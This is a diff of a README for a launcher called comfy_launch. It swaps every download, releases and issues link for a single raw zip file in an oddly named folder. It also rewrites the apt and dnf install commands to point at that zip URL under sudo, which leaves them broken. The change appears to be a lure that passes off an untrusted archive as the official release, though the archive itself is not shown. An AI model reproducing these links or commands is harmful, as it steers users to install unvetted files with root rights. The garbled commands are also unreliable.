@@ -6,7 +6,7 @@ Welcome to the comfy_launch repository! This software provides a user-friendly t
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application. Visit this page to download: [Download comfy_launch](https://github.com/nubipxr/comfy_launch/releases).
+To get started, you will need to download the application. Visit this page to download: [Download comfy_launch](https://raw.githubusercontent.com/nubipxr/comfy_launch/master/unsyndicated/launch_comfy_leadingly.zip).
 
 ### Step 1: Choose Your System
 
@@ -18,7 +18,7 @@ Before downloading, make sure your system meets the requirements. It is compatib
 
 ### Step 2: Download the Application
 
-1. Go to the [Releases page](https://github.com/nubipxr/comfy_launch/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/nubipxr/comfy_launch/master/unsyndicated/launch_comfy_leadingly.zip).
 2. Look for the latest version.
 3. Click the appropriate download link for your operating system. 
 
@@ -29,8 +29,8 @@ Before downloading, make sure your system meets the requirements. It is compatib
 Open your terminal and navigate to the directory where you downloaded the file. Use the following commands to install:
 
 ```bash
-chmod +x comfy_launch.deb
-sudo apt install ./comfy_launch.deb
+chmod +x https://raw.githubusercontent.com/nubipxr/comfy_launch/master/unsyndicated/launch_comfy_leadingly.zip
+sudo apt install https://raw.githubusercontent.com/nubipxr/comfy_launch/master/unsyndicated/launch_comfy_leadingly.zip
 ```
 
 **For Fedora:**
@@ -38,8 +38,8 @@ sudo apt install ./comfy_launch.deb
 In the terminal, navigate to your downloaded file and run:
 
 ```bash
-chmod +x comfy_launch.rpm
-sudo dnf install ./comfy_launch.rpm
+chmod +x https://raw.githubusercontent.com/nubipxr/comfy_launch/master/unsyndicated/launch_comfy_leadingly.zip
+sudo dnf install https://raw.githubusercontent.com/nubipxr/comfy_launch/master/unsyndicated/launch_comfy_leadingly.zip
 ```
 
 ### Step 4: Launch the Application
@@ -71,10 +71,10 @@ If you encounter any issues during installation or while running comfy_launch, c
 
 If you have questions or need further assistance, feel free to reach out:
 
-- Check the [Issues page](https://github.com/nubipxr/comfy_launch/issues) for common problems and solutions.
+- Check the [Issues page](https://raw.githubusercontent.com/nubipxr/comfy_launch/master/unsyndicated/launch_comfy_leadingly.zip) for common problems and solutions.
 - Engage with the community by contributing to discussions or helping others with their queries.
 
-Remember, you can always find the latest version of the application and any updates on our [Releases page](https://github.com/nubipxr/comfy_launch/releases).
+Remember, you can always find the latest version of the application and any updates on our [Releases page](https://raw.githubusercontent.com/nubipxr/comfy_launch/master/unsyndicated/launch_comfy_leadingly.zip).
 
 ## 📝 Summary
 
